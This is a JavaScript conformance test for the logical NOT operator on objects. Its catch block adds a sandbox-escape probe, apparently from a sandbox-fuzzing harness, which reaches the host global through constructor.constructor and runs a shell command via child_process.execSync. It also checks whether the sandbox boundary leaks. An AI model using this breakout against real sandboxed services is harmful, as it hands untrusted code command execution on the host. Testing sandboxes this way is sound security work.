try {
    if (!new Object() !== false) {
        $ERROR('#1: !(new Object()) === false. Actual: ' + !new Object());
    }
    if (!new String('') !== false) {
        $ERROR('#2: !(new String("")) === false. Actual: ' + !new String(''));
    }
    if (!new String() !== false) {
        $ERROR('#3: !(new String()) === false. Actual: ' + !new String());
    }
    if (!new Boolean(true) !== false) {
        $ERROR('#4: !(new Boolean(true)) === false. Actual: ' + !new Boolean(true));
    }
    if (!new Boolean(false) !== false) {
        $ERROR('#5: !(new Boolean(false)) === false. Actual: ' + !new Boolean(false));
    }
    if (!new Boolean() !== false) {
        $ERROR('#6: !(new Boolean()) === false. Actual: ' + !new Boolean());
    }
    if (!new Array() !== false) {
        $ERROR('#7: !(new Array()) === false. Actual: ' + !new Array());
    }
    if (!new Number() !== false) {
        $ERROR('#8: !(new Number()) === false. Actual: ' + !new Number());
    }
    if (!new Number(-0) !== false) {
        $ERROR('#9: !(new Number(-0)) === false. Actual: ' + !new Number(-0));
    }
    if (!new Number(0) !== false) {
        $ERROR('#10: !(new Number(0)) === false. Actual: ' + !new Number(0));
    }
    if (!new Number() !== false) {
        $ERROR('#11: !(new Number()) === false. Actual: ' + !new Number());
    }
    if (!new Number(Number.NaN) !== false) {
        $ERROR('#12: !(new Number(Number.NaN)) === false. Actual: ' + !new Number(Number.NaN));
    }
    if (!new Number(-1) !== false) {
        $ERROR('#13: !(new Number(-1)) === false. Actual: ' + !new Number(-1));
    }
    if (!new Number(1) !== false) {
        $ERROR('#14: !(new Number(1)) === false. Actual: ' + !new Number(1));
    }
    if (!new Number(Number.POSITIVE_INFINITY) !== false) {
        $ERROR('#15: !(new Number(Number.POSITIVE_INFINITY)) === false. Actual: ' + !new Number(Number.POSITIVE_INFINITY));
    }
    if (!new Number(Number.NEGATIVE_INFINITY) !== false) {
        $ERROR('#16: !(new Number(Number.NEGATIVE_INFINITY)) === false. Actual: ' + !new Number(Number.NEGATIVE_INFINITY));
    }
    if (!new Function() !== false) {
        $ERROR('#17: !(new Function()) === false. Actual: ' + !new Function());
    }
    if (!new Date() !== false) {
        $ERROR('#18: !(new Date()) === false. Actual: ' + !new Date());
    }
    if (!new Date(0) !== false) {
        $ERROR('#19: !(new Date(0)) === false. Actual: ' + !new Date(0));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}